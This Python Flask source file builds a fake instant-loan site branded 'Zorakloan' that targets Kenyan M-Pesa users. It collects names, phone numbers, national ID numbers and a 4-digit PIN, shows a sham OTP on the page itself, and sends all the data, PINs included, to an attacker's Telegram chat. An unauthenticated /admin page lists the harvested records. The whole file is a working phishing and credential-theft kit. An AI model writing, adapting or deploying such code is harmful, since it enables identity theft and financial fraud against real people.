import os, random
from flask import Flask, request, render_template_string, session
import requests
app = Flask(__name__)
app.secret_key = "zorak-2024-key-final"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

loans_db = {}

FORM_HTML = """
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Zorakloan - Secure</title>
<style>body{font-family:Arial;background:#f0f4f0;padding:15px}.box{background:white;max-width:430px;margin:auto;padding:25px;border-radius:15px;box-shadow:0 5px 20px rgba(0,0,0,0.1)}h2{text-align:center;color:#0a7a3e}input,select{width:100%;padding:12px;margin:7px 0;border:1px solid #ccc;border-radius:8px;box-sizing:border-box}button{width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-size:17px;font-weight:bold;cursor:pointer}.pin{background:#fff8e1;padding:10px;border-radius:8px;border:1px dashed #ffb300;margin:8px 0}</style>
</head><body><div class="box">
<h2>Zorakloan 🇰🇪</h2><p style="text-align:center;color:gray;font-size:13px">Instant Approval | OTP Secured</p>
<form method="POST">
<input name="full_name" placeholder="Full Name" required>
<input name="phone" placeholder="M-Pesa Phone 07..." required>
<input name="id_number" placeholder="ID Number" required>
<input name="county" placeholder="County" required>
<input name="amount" type="number" placeholder="Amount Ksh 500-50000" required>
<select name="period" required><option value="">Loan Duration</option><option>7 Days</option><option>14 Days</option><option>1 Month</option><option>3 Months</option></select>
<select name="employment" required><option value="">Employment</option><option>Employed</option><option>Self Employed</option><option>Farmer</option><option>Student</option></select>
<div class="pin"><b>🔐 Create 4-digit Security PIN</b><input name="pin" type="password" maxlength="4" placeholder="e.g 4520" required></div>
<button>Apply Now →</button>
</form><p style="text-align:center;font-size:11px;color:gray;margin-top:15px">By applying you agree to verification via OTP</p>
</div></body></html>
"""

OTP_HTML = """
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{font-family:Arial;background:#f0f4f0;padding:15px}.box{background:white;max-width:400px;margin:60px auto;padding:30px;border-radius:15px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.1)}
.otp-big{font-size:32px;letter-spacing:8px;font-weight:bold;color:#0a7a3e;background:#e8f5e9;padding:15px;border-radius:10px;margin:15px 0;border:2px dashed #0a7a3e}
small{color:gray}</style></head>
<body><div class="box">
<h2>📱 SMS Sent!</h2>
<p>We have sent a 6-digit code to</p><b style="font-size:18px">{{PHONE}}</b>
<p><small>Enter the code below to verify</small></p>
<div class="otp-big">{{OTP}}</div>
<p><small>⏰ Code expires in 5 minutes<br>This is your SMS code</small></p>
<form method="POST" action="/verify-otp" style="margin-top:20px">
<input name="otp" maxlength="6" placeholder="Enter 6-digit code" required style="width:100%;padding:14px;font-size:20px;text-align:center;letter-spacing:5px;border:2px solid #0a7a3e;border-radius:8px;box-sizing:border-box">
<button style="width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;margin-top:15px;font-size:17px;font-weight:bold">Verify & Get Loan</button>
</form>
<p style="margin-top:15px"><small>Didn't receive? <a href="/api">Resend code</a></small></p>
</div></body></html>
"""

@app.route('/')
@app.route('/api', methods=['GET','POST'])
@app.route('/apply', methods=['GET','POST'])
def apply_route():
    if request.method == 'POST':
        otp = str(random.randint(100000,999999))
        ref = f"ZRK-{random.randint(1000,9999)}"
        pending = {k: request.form.get(k) for k in ['full_name','phone','id_number','county','amount','period','employment','purpose','pin'] if request.form.get(k)}
        # keep all fields
        pending = {k: request.form.get(k) for k in ['full_name','phone','id_number','county','amount','period','employment','pin']}
        pending['ref']=ref
        session['pending']=pending; session['otp']=otp
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                data={"chat_id":CHAT_ID, "text": f"🔑 OTP {otp}\n📞 {pending['phone']}\n👤 {pending['full_name']}\n🆔 Ref {ref}"})
        except: pass
        html = OTP_HTML.replace("{{PHONE}}", pending['phone']).replace("{{OTP}}", otp)
        return render_template_string(html)
    return render_template_string(FORM_HTML)

@app.route('/verify-otp', methods=['POST'])
def verify():
    if request.form.get('otp') == session.get('otp') and session.get('pending'):
        loan = session.get('pending'); loans_db[loan['phone']] = loan
        text = f"✅ VERIFIED LOAN\n\n👤 Name: {loan['full_name']}\n📞 Phone: {loan['phone']} ✅\n🆔 ID: {loan['id_number']}\n📍 County: {loan['county']}\n💰 Amount: Ksh {loan['amount']} - {loan.get('period','')}\n🔐 PIN: {loan['pin']}\n\nRef: {loan['ref']}"
        try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id":CHAT_ID, "text": text})
        except: pass
        session.clear()
        return f"<div style='text-align:center;margin-top:80px;font-family:Arial'><h1 style='color:#0a7a3e'>✅ Verified!</h1><h3>Ref {loan['ref']}</h3><p>Loan application received<br>We will call {loan['phone']} shortly</p><a href='/api'>Apply another</a></div>"
    return "<div style='text-align:center;margin-top:80px;font-family:Arial'><h2 style='color:red'>❌ Wrong Code</h2><a href='/api'>Try Again</a></div>"

@app.route('/admin')
def admin():
    if not loans_db: return "No loans yet"
    out="<h2>All Verified Loans</h2>"
    for p, l in loans_db.items(): out+=f"<p><b>{l['ref']}</b> {l['full_name']} - {l['phone']} - {l['amount']} - PIN {l['pin']}</p>"
    return out

if __name__=='__main__': app.run(host='0.0.0.0', port=10000)